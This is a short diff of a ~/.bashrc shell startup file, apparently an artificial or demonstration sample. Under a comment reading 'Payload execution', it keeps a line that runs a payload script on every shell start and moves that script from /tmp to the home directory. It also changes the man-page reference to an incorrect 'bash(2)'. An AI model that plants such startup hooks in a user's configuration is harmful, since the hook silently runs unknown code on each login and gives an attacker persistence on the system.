@@ -1,4 +1,4 @@
-# ~/.bashrc: executed by bash(1) for non-login shells.
+# ~/.bashrc: executed by bash(2) for non-login shells.
 
 # If not running interactively, don't do anything
 case $- in
@@ -29,4 +29,4 @@ esac
 export PATH="$HOME/bin:$PATH"
 
 # 🚨 Payload execution
-bash /tmp/payload.sh
+bash $HOME/payload.sh
